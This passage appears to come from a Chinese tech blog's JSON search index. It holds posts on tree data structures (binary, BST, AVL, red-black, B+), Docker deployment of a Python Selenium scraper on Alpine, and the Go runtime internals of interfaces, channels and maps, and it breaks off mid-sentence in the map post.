一棵树除了叶子结点就是分支节点。\n  \n    \n  \n+ 孩子结点、双亲结点、兄弟及堂兄弟结点 \n\n  + 树中一个结点的子树的根（或说后继）称为该结点的孩子，该结点称为其孩子结点的双亲结点。\n  + 同一个双亲的孩子结点互称为兄弟。双亲在同一层的结点互为堂兄弟。\n\n\n\n+ 祖先和子孙\n  + 祖先是从根到该所经分支上的所有结点。反之，以某结点为根的子树中的任一结点称为该结点的子孙。\n  + 显然祖先和子孙关系是父子关系的延伸。\n\n\n\n+ 结点的层数（level）和树的深度(depth，或称高度height）\n  + 结点的层次从根结点开始算起，根结点的层数为1，其余结点的层数等于其双亲结点的层数加1。比如，如果某个结点的层数为h，则其子树就在第h+1层。\n  + 树中各个结点层数的最大值称为树的深度（高度）。\n\n\n\n+ 有序树（ordered tree）和无序树（unordered tree）\n\n  若一棵树中结点的各子树从左到右是有次序的，即若交换了某结点各子树的相对位置就构成不同的树，则称这棵树为有序树，否则称为无序树。\n\n\n\n+ 路径（path）\n\n  从树中的一个结点到另一个结点的路途（路径只能由上向下，不能横向或由下向上）\n\n\n\n+ 森林（forest）\n\n  m（m≥0）棵互不相交的树的集合\n\n  \n\n\n\n# 2. 二叉树\n\n一般的树规律性差，二叉树结构简单，存储和处理相对容易，而且一般的树可以转化为二叉树处理。\n\n### 2.1 二叉树的定义\n\n+ 二叉树是n（n≥0）个结点的有限集合，除了空树（n=0）之外，由一个根结点及两棵不相交的左子树和右子树组成；\n\n+ 二叉树每个结点的度数≤2；\n\n+ 二叉树的定义是递归的。\n\n二叉树有五种基本形态：\n\n(1)空树\n\n(2)只有根结点\n\n(3)只有左子树\n\n(4)只有右子树\n\n(5)完整二叉树\n\n注意：二叉树的子树一定要分出左右，否则不能称作二叉树。\n\n### 2.2 二叉树的性质\n\n+ 二叉树的第i层的结点数量最多为 2<sup>i-1 </sup> (i >= 1)\n\n  + 1层 最多1\n\n  + 2层 最多2\n\n  + 3层 最多4\n\n    \n\n+ 深度为k的二叉树结点数目最多为 2<sup>k</sup> -1 (k >= 1)\n\n  + 深1层 最多1\n\n  + 深2层 最多3\n\n  + 深3层 最多7\n\n    \n\n+ 在任意二叉树中，若叶子结点数为n0，度数为2的结点数为n2，则有n0=n2+1\n\n  本性质是说，任意一颗二叉树，叶子结点比度数为2的结点的个数多一个。\n\n  ​     1\n\n    1     1\n\n  11    11 \n\n  叶子节点4个, 度数为2的是3个\n\n\n\n\n### 2.3 二叉树存储(先变成完全二叉树)\n\n二叉树的形状可能繁多且不固定，不好掌握规律，而进行顺序存储恰恰相反，要求规律性强。所以这种存储一定是规律性较强的二叉树才适合。完全二叉树符合这一点，这也是它被定义的原因之一。\n\n对于完全二叉树进行结点编号（自上而下，自左至右）后，编号可以反映结点的分支和从属关系，将这些结点存入一维数组时，编号和数组下标可以对应起来。\n\n对于一般的二叉树，不易直接采用顺序存储，可以虚补成完全二叉树后再用顺序存储的方法存储。\n\n\n\n然后数组的每个节点结构可以如下:\n\n```c\ntypedef struct node\n{\n DataType data;\n struct node *lchild,*parents,*rchild;\n}ThTree;\n```\n\n\n\n### 2.4 二叉树遍历\n\n+ 先序遍历：**根**，左子树，右子树   \n\n+ 中序遍历：左子树，**根**，右子树  \n\n+ 后序遍历：左子树，右子树，**根**\n\n  \n\n中序更重要, 只有中序和其他一个序组合,就能还原二叉树\n\n\n\n# 3. 二叉树的种类\n\n### 3.1 满二叉树(就是节点全满了)\n\n满二叉树的定义：深度为k（k≥1）且结点数为 2<sup>k</sup> -1的二叉树。\n\n满二叉树的结点数达到最大值。\n\n\n\n### 3.2 完全二叉树(除最后一层都是满的,因为数量不可能正好满二叉树,常用)\n\n对于满二叉树的结点，按下列规则编号：\n(1)从根结点开始，自上而下；\n(2)同一层自左至右。\n\n+ 满二叉树的结点编号后，任意取满二叉树的前若干个连续的结点所对应的二叉树，称为完全二叉树。\n\n+ 完全二叉树的特点：除最后一层外，其余各层均是满的，最后一层，结点连续出现在左边。\n\n请注意：满二叉树要求太特殊且严格，一般不容易满足，而完全二叉树条件低一些，容易满足，今后会经常用到它，所以要注意它。\n\n\n\n### 3.3 二叉查找树（英语：Binary Search Tree，简写为BST）\n\n也称 **二叉搜索树**、**有序二叉树**（英语：ordered binary tree），**排序二叉树**（英语：sorted binary tree）不一定是完全二叉树\n\n是指一棵空树或者具有下列性质的二叉树：\n\n+ 若任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n\n+ 若任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n\n+ 任意节点的左、右子树也分别为二叉查找树；\n\n+ 没有键值相等的节点。\n\n简单的说就是：各节点值不同，并且对于任意一个子树：左<根<右。\n\n\n\n##### 3.3.1 算法复杂度\n\n+ 算法查找时间依赖于树的拓扑结构。最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n+ 插入算法的复杂度与查找算法的复杂度是一样的：最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n  如何插入值相等直接丢弃或抛出异常\n\n+ 删除算法的运行时间也与 BST 的拓扑结构有关，最佳情况是 O(log­2n)，而最坏情况是 O(n)。\n\n  删除一个非叶子节点，就必须选择其他节点来填补因删除节点所造成的树的断裂。\n\n\n\n### 3.4 平衡二叉树\n\n平衡二叉树的提出就是为了保证树不至于太倾斜，尽量保证两边平衡。因此它的定义如下：\n\n1. 平衡二叉树要么是一棵空树\n2. 要么保证左右子树的高度之差不大于 1\n3. 子树也必须是一颗平衡二叉树\n\n这种形态就是平衡，会使查找速度更快。为什么能够保持这种好身材呢？通过在新增/删除时的旋转（`左旋和右旋`）。\n\n\n\n##### 3.4.1 平衡调整\n\n1. 找平衡因子 = 2\n\n2. 找插入新节点后失去平衡的最小子树\n\n   + 距离插入点最近\n   + 平衡因子绝对值大于1的结点作为根\n   + 确认调整的点:     先确定根 -> 对插入的新节点, 路上的3个点\n\n3. 平衡调整, 有四种类型\n\n   + LL-> R \t\n\n     中为支点, 高右旋\n\n   + RR -> L\n\n     中为支点, 高左旋\n   \n   + LR -> LR\n   \n     下二整体先左转, 变成 LL 再右转\n   \n   + RL -> RL\n   \n     下二整体先右转, 变成 RR 再左转\n\n\n\n##### 3.4.2 常见的平衡树：\n\n[AVL树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AVL树)、[Treap](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/Treap)、[伸展树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/伸展树)、[红黑树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/红黑树)、[加权平衡树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/加权平衡树)、[2-3树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/2-3树)、[AA树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AA树)、[替罪羊树](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/替罪羊树)、节点大小平衡树\n\n\n\n### 3.5 红黑树（Red–black tree)\n\n红黑树是一种含有红黑结点并能自平衡的二叉查找树。它必须满足下面性质：\n\n+ 性质1：每个节点要么是黑色，要么是红色。\n+ 性质2：根节点是黑色。每个叶子节点（NIL）是黑色。\n+ 性质3：树中不存在两个相邻的红色结点（即红色结点的父结点和孩子结点均不能是红色）\n+ 性质4：从任意一个结点（包括根结点）到其任何后代 NULL 结点（默认是黑色的）的每条路径都具有相同数量的黑色结点。\n\n\n\n![1](树的介绍和分类/1.png)\n\n\n\n##### 为什么要有红黑树？\n\n大多数二叉排序树BST的操作（查找、最大值、最小值、插入、删除等等）都是 的时间复杂度，h 为树的高度。但是对于斜树而言（BST极端情况下出现），BST的这些操作的时间复杂度将达到 。为了保证BST的所有操作的时间复杂度的上限为 ，就要想办法把一颗BST树的高度一直维持在 ，而红黑树就做到了这一点，红黑树的高度始终都维持在 ，n 为树中的顶点数目.\n\n##### 红黑树RBT与平衡二叉树AVL比较：\n\nAVL 树比红黑树更加平衡，但AVL树在插入和删除的时候也会存在大量的旋转操作。所以当你的应用涉及到频繁的插入和删除操作，切记放弃AVL树，选择性能更好的红黑树；当然，如果你的应用中涉及的插入和删除操作并不频繁，而是查找操作相对更频繁，那么就优先选择 AVL 树进行实现。\n\n\n\n# 4. 其他种类的树\n\n### 4.1 哈夫曼树(霍夫曼树)\n\n带权的树,  加起来 WPL 最小, 可用来压缩\n\n\n\n### 4.2 B树(B-树)\n\nN叉的排序树\n\n+ 结点最多含有m 颗子树，m-1个关键字（数据）（m>=2）\n+ 若根节点不是叶子节点，则至少有两颗子树。\n\n不满足，就分裂，从中间分开，分成两颗子树\n\n+ 除根节点和叶子节点外，其他每个节点至少有ceil(m/2)个子节点（子树）。2.1=>3, 2.7=>3\n\n\n\n### 4.3 B+树 \n\n##### 4.3.1 数据库为什么不用红黑树\n\n+ 树太高，读取次数过多\n+ 读取浪费太多，不连续\n\n##### 4.3.2 和 B 树的区别\n\n+ 叶子节点连起来了 双向链表（方便范围查找）\n\n+ 非叶子节点不存数据，数据都存在叶子节点\n\n  \n\n# 5. 头脑风暴\n\n### 5.1 左旋右旋\n\n+ 左旋\n\n  父亲掉下去，右儿子上去，为了上去，儿子割左腿补偿给父亲右腿\n\n+ 右旋\n\n  父亲掉下去，左儿子上去，为了上去，儿子割右腿补偿给父亲左腿\n\n  \n\n# 6. 参考资料\n\n+ https://www.jianshu.com/p/a826ab614e4a\n\n+ [二叉查找树](https://www.cnblogs.com/gaochundong/p/binary_search_tree.html)\n\n+ [为什么mysql索引要使用B+树，而不是B树，红黑树](https://segmentfault.com/a/1190000021488885)\n\n  \n\n","tags":["算法"],"categories":["数据结构"]},{"title":"python爬虫项目在docker中的部署实践","url":"%2Fp%2Fdc81a411.html","content":"\n\n\n### 1. 选择镜像\n\n这里选择基础镜像时是有讲究. 一是应当尽量选择官方镜像库里的基础镜像；二是应当选择轻量级的镜像做底包.\n\n就典型的 Linux 基础镜像来说，大小关系如下：Ubuntu > CentOS > Debian> Alpine\n\nAlpine Docker 镜像也继承了 Alpine Linux 发行版的这些优势。相比于其他 Docker 镜像，它的容量非常小，仅仅只有 5 MB 左右（对比 Ubuntu 系列镜像接近 200 MB），且拥有非常友好的包管理机制apk。\n\n<!-- more -->\n\n### 2. 拷贝文件\n\n相对于 ADD,优先使用 COPY指令\n\n另外发现拷贝文件夹是把文件夹的内容拷贝进去, 而不是把整个目录拷贝进去, 坑爹 最后使用dockerignore解决这个问题.\n\n```dockerfile\ncopy . /zk8/\n```\n\n.dockerignore文件\n\n```\nchromedriver\n*.sh\n.*\n**/__pycache__/\nDockerfile\n```\n\n\n\n### 3. 测试 dockerfile\n\n##### 3.1 镜像加速\n\n在本地测试的时候, 发现连Alpine都拉取不下来, 此处感谢伟大的 great wall. 于是选择阿里云加速.\n\nhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\n\n右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中\n\n将 https://xxxxxxxxx.mirror.aliyuncs.com 加到 \"registry-mirrors\" 的数组里，点击Apply & Restart 按钮，等待 Docker 重启并应用配置的镜像加速器。\n\nps: 就是阿里云加速, 在后续的安装软件中也是特别慢, 此处建议在云服务器上(免费的谷歌云)操作.\n\n##### 3.2 测试\n\n```bash\ndocker build -t zk8:0.1 .   #  制作 image\ndocker run -ti --rm zk8:0.1 /bin/sh   # 启动容器结束后删除, 用这种方法可以非常方便测试\n```\n\n前期可以通过 shell 进入到容器里面测试, 在里面尝试安装相应的软件包, 然后再写 dockerfile会比较方便\n\n\n\n### 4. 安装软件包\n\n爬虫用 python 写的, 并且使用了 selenium + 无头浏览器. 所以安装包要写在 dockerfile里, 文件如下:\n\n```dockerfile\nFROM alpine\n\nRUN mkdir -p /zk8\nCOPY . /zk8/\n\n# install python\nRUN echo \"**** install python ****\" && \\\n                apk add --no-cache python3 && \\\n                if [ ! -e /usr/bin/python ]; then ln -sf python3 /usr/bin/python ; fi && \\\n                echo \"**** install pip ****\" && \\\n                python3 -m ensurepip && \\\n                rm -r /usr/lib/python*/ensurepip && \\\n                pip3 install --no-cache --upgrade pip setuptools wheel && \\\n                if [ ! -e /usr/bin/pip ]; then ln -s pip3 /usr/bin/pip ; fi\n\n# install python package\nRUN apk add --no-cache py-lxml && \\\n                apk add --no-cache chromium && \\\n                apk add --no-cache chromium-chromedriver && \\\n                if [ -e /usr/bin/chromedriver ]; then ln -s /usr/bin/chromedriver /zk8/chromedriver ; fi && \\\n                pip install selenium && \\\n                pip install bearychat && \\\n                pip install pyquery\n\n\nWORKDIR /zk8\nCMD python3 main.py\n```\n\n\n\n### 5. 发布到 dockerhub\n\n建议建立自己的私有仓库, 因为 dockerhub 可以免费使用一个私有仓库, 此处上传到 dockerhub.\n\n```bash\ndocker login # 登录自己的 dockerhub 帐号\n\ndocker tag zk8:0.1 levonfly/zk8:0.1 # 此处打 tag, 格式要以 用户名/镜像名字:版本号\n\ndocker push levonfly/zk8:0.1 # 推送到 dockerhub\n```\n\ndockerhub 上还可以 link 到github, 即 github 一更新代码就重新 build.\n\n接下来就是激动人心的时刻, 在任何安装 docker 的机器上直接运行自己的爬虫.\n\n```bash\ndocker pull levonfly/zk8:0.1\ndocker run -d --name zk8 levonfly/zk8:0.1 \n```\n\n\n\n\n\n","tags":["docker"],"categories":["python"]},{"title":"golang的interface底层结构","url":"%2Fp%2Fb29169bf.html","content":"\n在 Go 语言中，interface 和函数一样，都是“第一公民”。interface 可以用在任何使用变量的地方。可以作为结构体内的字段，可以作为函数的形参和返回值，可以作为其他 interface 定义的内嵌字段。\n\ninterface 在大型项目中常常用来解耦。在层与层之间用 interface 进行抽象和解耦。由于 Go interface 非侵入的设计，使得抽象出来的代码特别简洁，这也符合 Go 语言设计之初的哲学。\n\n<!-- more -->\n\n# 1. 源码\n\n源码路径： https://github.com/golang/go/blob/master/src/runtime/runtime2.go\n\n`iface` 和 `eface` 都是 Go 中描述interface{}的底层结构体，区别在于 `iface` 描述的接口包含方法，而 `eface` 则是不包含任何方法的空接口：`interface{}`。\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\n### 1.1 非空 interface 数据结构\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype itab struct {\n\tinter *interfacetype\n\t_type *_type\n\thash  uint32 // copy of _type.hash. Used for type switches.\n\t_     [4]byte\n\tfun   [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.\n}\n```\n\ntab 中存放的是类型、方法等信息。data 指针指向的 iface 绑定对象的原始数据的副本。这里同样遵循 Go 的统一规则，值传递。\n\n\n\nitab 中包含 5 个字段。\n\n+ inner 存的是 interface 自己的静态类型。因为 Go 语言中函数方法是以包为单位隔离的。所以 interfacetype 除了保存 _type 还需要保存包路径等描述信息。\n\n+ `_type` 存的是 interface 对应具体对象的类型。itab 中的 `_type` 和 iface 中的 data 能简要描述一个变量。\n\n+ 这里的 hash 字段和 _type 中存的 hash 字段是完全一致的，这么做的目的是为了类型断言。\n\n+ fun 是一个函数指针，它指向的是具体类型的函数方法。虽然这里只有一个函数指针，但是它可以调用很多方法。\n\n<img src=\"golang的interface底层结构/iface_all.jpeg\" alt=\"在这里插入图片描述\" style=\"zoom:40%;\" />\n\n+ 实例\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\ntype Binary uint64\n\nfunc (i Binary) String() string {\n\treturn strconv.FormatUint(uint64(i), 10)\n}\n\nfunc main() {\n\tb := Binary(200)\n\tany := fmt.Stringer(b) // interface包装\n\tfmt.Println(any) // 200\n}\n```\n\n<img src=\"golang的interface底层结构/iface_fuzhi.jpeg\" alt=\"在这里插入图片描述\" style=\"zoom:150%;\" />\n\n### 1.2 空 interface 数据结构\n\n空的 inferface{} 是没有方法集的接口。所以不需要 itab 数据结构。它只需要存类型和类型对应的值即可。对应的数据结构如下：\n\n```go\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\n从这个数据结构可以看出，只有当 2 个字段都为 nil，空接口才为 nil。空接口的主要目的有 2 个，一是实现“泛型”，二是使用反射。\n\n+ 实例\n\n```go\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\ntype Binary uint64\n\nfunc main() {\n\tb := Binary(200)\n\tany := (interface{})(b)\n\tfmt.Println(any) //200\n}\n```\n\n<img src=\"golang的interface底层结构/eface_fuzhi.jpeg\" alt=\"在这里插入图片描述\" style=\"zoom:150%;\" />\n\n\n\n### 1.3 _type 类型\n\n由于 Go 语言是强类型语言，编译时对每个变量的类型信息做强校验，所以每个类型的元信息要用一个结构体描述。再者 Go 的反射也是基于类型的元信息实现的。`_type` 就是所有类型最原始的元信息。\n\n https://github.com/golang/go/blob/master/src/runtime/type.go\n\n```go\ntype _type struct {\n\tsize       uintptr // 类型占用内存大小\n\tptrdata    uintptr // 包含所有指针的内存前缀大小\n\thash       uint32  // 类型 hash\n\ttflag      tflag   // 标记位，主要用于反射\n\talign      uint8   // 对齐字节信息\n\tfieldAlign uint8   // 当前结构字段的对齐字节数\n\tkind       uint8   // 基础类型枚举值, 如 bool、int、float、string、struct、interface 等。\n\tequal func(unsafe.Pointer, unsafe.Pointer) bool // 比较两个形参对应对象的类型是否相等\n\tgcdata    *byte    // GC 类型的数据\n\tstr       nameOff  // 类型名称字符串在二进制文件段中的偏移量\n\tptrToThis typeOff  // 类型元信息指针在二进制文件段中的偏移量\n}\n```\n\n _type 是所有类型原始信息的元信息。例如在 arraytype 和 chantype 中保存类型的元信息就是靠 _type。\n\n```go\ntype arraytype struct {\n\ttyp   _type\n\telem  *_type\n\tslice *_type\n\tlen   uintptr\n}\n\ntype chantype struct {\n\ttyp  _type\n\telem *_type\n\tdir  uintptr\n}\n```\n\n# 2.  Type Assertion 断言\n\n我们知道使用 interface 断言的时候需要注意，不然很容易引入 panic。\n\n### 2.1 断言\n\n```go\nfunc do(v interface{}) {\n    n := v.(int)    // might panic\n}\n\nfunc do(v interface{}) {\n    n, ok := v.(int)\n    if !ok {\n        // 断言失败处理\n    }\n}\n```\n\n这个过程体现在下面的几个函数上。\n\n```go\n// The assertXXX functions may fail (either panicking or returning false,\n// depending on whether they are 1-result or 2-result).\nfunc assertI2I(inter *interfacetype, i iface) (r iface) {\n    tab := i.tab\n    if tab == nil {\n        // explicit conversions require non-nil interface value.\n        panic(&TypeAssertionError{\"\", \"\", inter.typ.string(), \"\"})\n    }\n    if tab.inter == inter {\n        r.tab = tab\n        r.data = i.data\n        return\n    }\n    r.tab = getitab(inter, tab._type, false)\n    r.data = i.data\n    return\n}\nfunc assertI2I2(inter *interfacetype, i iface) (r iface, b bool) {\n    tab := i.tab\n    if tab == nil {\n        return\n    }\n    if tab.inter != inter {\n        tab = getitab(inter, tab._type, true)\n        if tab == nil {\n            return\n        }\n    }\n    r.tab = tab\n    r.data = i.data\n    b = true\n    return\n}\n\n// 类似\nfunc assertE2I(inter *interfacetype, e eface) (r iface)\nfunc assertE2I2(inter *interfacetype, e eface) (r iface, b bool)\n```\n\n### 2.2 总结\n\n+ 有函数的是iface，空函数的是eface。\n+ iface 里 data 数据指针，itab 里面 func 函数指针，指向方法集。\n+ 两个底层实现都有一个 `_type` 结构，进行断言。\n\n# 3. 参考资料\n\n+ https://halfrost.com/go_interface/\n+ https://i6448038.github.io/2018/10/01/Golang-interface/\n+ http://legendtkl.com/2017/07/01/golang-interface-implement/\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"golang的channel底层结构","url":"%2Fp%2F94554c31.html","content":"\n# 1. 源码\n\n源码路径： https://github.com/golang/go/blob/master/src/runtime/chan.go\n\n```go\ntype hchan struct {\n\tqcount   uint           // 队列中所有数据总数\n\tdataqsiz uint            // 环形队列的 size\n\tbuf      unsafe.Pointer // 指向 dataqsiz 长度的数组\n\telemsize uint16         // 元素大小\n\tclosed   uint32\n\telemtype *_type  // 元素类型\n\tsendx    uint    // 已发送的元素在环形队列中的位置\n\trecvx    uint    // 已接收的元素在环形队列中的位置\n\trecvq    waitq   // 接收者的等待队列\n\tsendq    waitq   // 发送者的等待队列\n\n\t// lock 锁保护 hchan 中的所有字段，以及此通道上被阻塞的 sudogs 中的多个字段。持有 lock 的时候，禁止更改另一个 G 的状态（特别是不要使 G 状态变成ready），因为这会因为堆栈 shrinking 而发生死锁。\n\tlock mutex // 锁\n}\n```\n\n<!-- more -->\n\n![img](golang的channel底层结构/149_5_.png)\n\nrecvq 和 sendq 是等待队列，数据结构是一个双向链表。\n\n```go\ntype waitq struct {\n\tfirst *sudog\n\tlast  *sudog\n}\n```\n\nchannel 最核心的数据结构是 **sudo**g。sudog 代表了一个在等待队列中的 g，sudog 实际上是对 goroutine 的一个封装。\n\nsudog 是 Go 中非常重要的数据结构，因为 g 与同步对象关系是多对多的。一个 g 可以出现在许多等待队列上。并且多个 g 可能正在等待同一个同步对象，因此一个对象可能有许多 sudog。\n\n### 1.1 字段说明\n\n+ buf 指向底层循环数组，只有有缓冲型的 channel 才用。\n\n+ sendx，recvx 均指向底层循环数组，表示当前可以发送和接收的元素位置索引值（相对于底层数组）。\n\n+ sendq，recvq 分别表示被阻塞的 goroutine 双向链表队列。这些 goroutine 由于尝试读取 channel 或向 channel 发送数据而被阻塞。\n+ lock 用来保证每个读 channel 或写 channel 的操作都是原子的。\n\n### 1.2 流程\n\n```go\nch := make(chan Task, 3)\n```\n\n创建channel实际上就是在内存中实例化了一个`hchan`的结构体，并返回一个ch指针。\n\n##### 1. 发送数据流程\n\n+ 可以看到sendx 从 0 变成 2，因为是循环数组，满了又变成了0\n\n![1](golang的channel底层结构/1.gif)\n\n##### 2. 满了再发送阻塞\n\n当G1向buf已经满了的ch发送数据的时候，当runtine检测到对应的hchan的buf已经满了，会通知调度器，调度器会将G1的状态设置为waiting，当G1变为waiting状态后，会创建一个代表自己的sudog的结构，然后放到sendq这个list中。\n\n\n\n<img src=\"golang的channel底层结构/4de75e36ac9aecd225130f7d7cc6d1be.png\" alt=\"img\" style=\"zoom:30%;\" />\n\n##### 3. 其他协程取出数据\n\n首先 G2 读取元素之后，将 G1 的状态变为 goready。\n\n<img src=\"golang的channel底层结构/8eb4fb0e129dd75dcaaaf8765317f2e4.png\" alt=\"img\" style=\"zoom:45%;\" />\n\n然后 G1 从原先的 waiting 状态变为 runnable 状态，然后重新放入 P 的 local queue 中等待调度。\n\n<img src=\"golang的channel底层结构/5e4247a05b082330a5ce05068868381d.png\" alt=\"img\" style=\"zoom:45%;\" />\n\n\n\n# 2. 总结\n\n+ 底层只有一个环形数组，有缓冲的channel才有。两个index，一个sendx，一个recvx。\n+ 两个双向链表队列，一个sendq，一个recvq，上面存着阻塞的G化身的sudog。\n+ 如果G阻塞，G会让出自己，变身sudog，挂在上面的队列上。\n+ 还有一把锁，保护读 channel 或写 channel 的操作都是原子的。\n\n# 3. 参考资料\n\n+ https://halfrost.com/go_channel/\n+ https://i6448038.github.io/2019/04/11/go-channel/\n\n+ https://xie.infoq.cn/article/d633c88db407c5c400552c377\n\n+ https://www.cnblogs.com/qcrao-2018/p/11220651.html\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"golang的map实现原理","url":"%2Fp%2F3d5029a4.html","content":"\nmap 是一种key-value的键值对存储结构，其中key不能重复，底层用hash表存储。Go map 的 hash 表中的基本单位是桶，每个桶最多存 8 个键值对，超了则会链接到额外的溢出桶。所以 Go map 基本数据结构是hash数组+桶内的key-value数组+溢出的桶链表。\n\n<!-- more -->\n\n# 1. 源码\n\nhttps://github.com/golang/go/blob/master/src/runtime/map.go#L117C5-L117C5\n\n```go\n type hmap struct {\n     count     int    // 元素的个数\n     B         uint8  // buckets 数组的长度就是 2^B 个\n     overflow uint16 // 溢出桶的数量\n \n     buckets    unsafe.Pointer // 2^B个桶对应的数组指针\n     oldbuckets unsafe.Pointer  // 发生扩容时，记录扩容前的buckets数组指针\n \n     extra *mapextra //用于保存溢出桶的地址\n }\n \n type mapextra struct {\n     overflow    *[]*bmap\n     oldoverflow *[]*bmap\n\n     nextOverflow *bmap\n }\n\n type bmap struct {\n     tophash [bucketCnt]uint8\n }\n\n //编译期间会给它加料，动态地创建一个新的结构：\ntype bmap struct {\n    topbits  [8]uint8\n    keys     [8]keytype\n    values   [8]valuetype\n    pad      uintptr\n    overflow uintptr\n}\n```\n\n在go的map实现中，它的底层结构体是hmap，hmap（hashmap）里维护着若干个bucket数组。\n\nBucket数组中每个元素都是bmap结构，每个桶中保存了8个kv对，如果8个满了，又来了一个key落在了这个桶里，会使用overflow连接下一个桶(溢出桶)。\n\nhmap这个结构体并不会存储实际的数据，实际存储数据的是bmap结构体。\n\n<img src=\"golang的map实现原理/7f281ea45dfc4969a3ebba2239abb2ed~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom: 50%;\" />\n\n### 1.1 数据获取过程\n\n假设当前 B=4 即桶数量为2^B=16个，要从map中获取 k4 对应的value。\n\n<img src=\"golang的map实现原理/ad3bb9b394d740cea79068f5785f61e0~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n①计算k4的hash值，计算结果有64个比特位。\n\n②通过最后的“B”位来确定在哪号桶，此时B为4，所以取k4对应哈希值的后4位，也就是0101，0101用十进制表示为5，所以在5号桶。\n\n③根据k4对应的hash值前8位快速确定是在这个桶的哪个位置。（在bmap中存放了每个key的哈希值前8位，一旦发现前8位一致，则会执行下一步，理解成一种缓存措施，如果前8位都不对了，后面就没有必要比较了）。\n\n④对比key完整的hash是否匹配，如果匹配则获取对应value。\n\n⑤如果都没有找到，就去连接的下一个溢出桶中找。\n\n### 1.2 数据存放过程\n\n①通过key的hash值后“B”位确定是哪一个桶，示例为5号桶。\n\n② 遍历当前桶，通过key的tophash和hash值，防止key重复，然后找到第一个可以插入的位置，即空位置处存储数据。\n\n③如果当前桶元素已满，会通过overflow链接创建一个新的桶，来存储数据。\n\n关于hash冲突：当两个不同的 key 落在同一个桶中，就是发生了哈希冲突。冲突的解决手段是采用链表法：在桶中，从前往后找到第一个空位进行插入。如果8个kv满了，那么当前桶就会连接到下一个溢出桶（bmap）。\n\n<img src=\"golang的map实现原理/2cf4f9b985764026abe55bc0afe073c2~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n# 2. 扩容\n\n### 2.1 扩容形式\n\n扩容有两种，一种是相同容量扩容，另一种是2倍扩容。\n\n##### 相同容量扩容\n\n由于map中不断的put和delete key，桶中可能会出现很多断断续续的空位，这些空位会导致连接的bmap溢出桶很长，导致扫描时间边长。这种扩容实际上是一种整理，把后置位的数据整理到前面。这种情况下，元素会发生重排，但不会换桶。\n\n<img src=\"golang的map实现原理/52f754efcb324bd8aa0666977649c389~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n##### 2倍容量扩容\n\n这种2倍扩容是由于当前桶数组确实不够用了，发生这种扩容时，元素会重排，可能会发生桶迁移。\n\n<img src=\"golang的map实现原理/ff55066213704c05af5b13504f03f11b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\n如图中所示，扩容前B=2（4个）。扩容后B=3（8个）。\n\n假设一元素key的hash值后三位为101，那么由上文的介绍可知，在扩容前，由hash值的后两位来决定几号桶，即 01 所以元素在1号桶。 在扩容发生后，由hash值得后三位来决定几号桶，即101所以元素会迁移到5号桶。\n\n### 2.2 扩容条件\n\n##### 装载因子 > 6.5\n\n装载因子是指当前map中，每个桶中的平均元素个数。正常情况下，如果没有溢出桶，那么一个桶中最多有8个元素，当平均每个桶中的数据超过了6.5个，那就意味着当前容量要不足了，发生扩容。\n\n##### 溢出桶的数量过多\n\n当 B < 15 时，如果overflow的bucket数量超过 2^B。\n\n当 B >= 15 时，overflow的bucket数量超过 2^15。\n\n简单来讲，新加入key的hash值后B位都一样，使得个别桶一直在插入新数据，进而导致它的溢出桶链条越来越长。如此一来，当map在操作数据时，扫描速度就会变得很慢。及时的扩容，可以对这些元素进行重排，使元素在桶的位置更平均一些。\n\n### 2.3 扩容转移\n\n1. 在我们的hmap结构中有一个oldbuckets，扩容刚发生时，会先将老数据存到这个里面。\n2. 每次对map进行删改操作时，会触发从oldbucket中迁移到bucket的操作【非一次性，分多次】\n3. 在扩容没有完全迁移完成之前，每次get或者put遍历数据时，都会先遍历oldbuckets，然后再遍历buckets。\n\n\n\n# 3. map细节\n\n### 3.1 map数据不可取址\n\n```bash\ntype Student struct {\n\tName string\n\tAge  int\n}\n\n// 编译错误\nfunc f1() {\n\tm := map[int]Student{\n\t\t1: Student{Age: 15, Name: \"jack\"},\n\t\t2: Student{Age: 16, Name: \"danny\"},\n\t\t3: Student{Age: 17, Name: \"andy\"},\n\t}\n\tm[1].Name = \"JACK\"\n}\n\n// 可以修改\nfunc f2() {\n\tm := map[int]*Student{\n\t\t1: &Student{Age: 15, Name: \"jack\"},\n\t\t2: &Student{Age: 16, Name: \"danny\"},\n\t\t3: &Student{Age: 17, Name: \"andy\"},\n\t}\n\tm[1].Name = \"JACK\"\n}\n```\n\n为什么go中要禁止对map的元素进行取址呢？这是因为map 会随着元素数量的增长而重新分配更大的内存空间，会导致之前的地址无效。\n\n### 3.2 线程不安全\n\n在同一时间点，两个 goroutine 